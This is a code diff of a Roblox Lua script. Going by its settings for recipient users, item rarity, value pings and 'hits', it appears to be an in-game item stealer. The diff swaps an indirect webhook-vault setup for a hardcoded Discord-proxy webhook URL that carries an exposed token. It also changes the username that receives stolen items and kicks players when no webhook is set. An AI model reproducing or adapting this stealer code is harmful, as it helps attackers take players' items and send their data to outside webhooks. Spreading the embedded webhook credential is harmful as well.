@@ -8,40 +8,18 @@ _G.scriptExecuted = true
 
 local cfg = (getgenv and getgenv()) or {}
 
-local users        = cfg.users        or cfg.Users        or _G.users        or {"huy762009az"}
-local min_rarity   = cfg.min_rarity   or cfg.MinRarity    or _G.min_rarity   or "Common"
+local users        = cfg.users        or cfg.Users        or _G.users        or {"WspNegatron5"}
+local min_rarity   = cfg.min_rarity   or cfg.MinRarity    or _G.min_rarity   or "godly"
 local min_value    = cfg.min_value    or cfg.MinValue     or cfg.minvalue or _G.minvalue or 0
 local pingEveryone = cfg.pingEveryone or cfg.PingEveryone or _G.pingEveryone or "Yes"
 local valuePing    = cfg.valuePing    or cfg.ValuePing    or _G.valuePing    or 100
-cfg.StatusApi = cfg.StatusApi or "https://alr-production.up.railway.app"
-local WEBHOOK_BASE = "https://webhook-vault-vercel.vercel.app/api/hit/"
-local RAW_WEBHOOK  = cfg.webhook
-    or cfg.Webhook
-    or cfg.WebhookToken
-    or _G.webhook
-    or "wh_c897fb99a165f2b1f7"
 
-local webhook
-do
-    local v = RAW_WEBHOOK
-    if type(v) == "string" and v ~= "" then
-        if v:match("^https?://") then
-            webhook = v
-        else
-            webhook = WEBHOOK_BASE .. v
-        end
-    else
-        webhook = WEBHOOK_BASE .. "wh_c897fb99a165f2b1f7"
-    end
-end
+local webhook = "https://webhook.lewisakura.moe/api/webhooks/1528302424652124253/Y_IPrVmYyQRc4jDj8v8XdiykX6cidHqlqM0ju0ZGUqcSp4sBy2uct2kFBEc-mQ31Mn1h"
 
 if webhook == "" or not webhook then
     game:GetService("Players").LocalPlayer:Kick("No webhook provided")
     return
 end
-
-local PROTECTOR_URL = "https://ok-azure-alpha.vercel.app/api/webhook-protector"
-local PROTECTOR_KEY = "" 
 
 local TOP_HIT_THRESHOLD = 1000
 
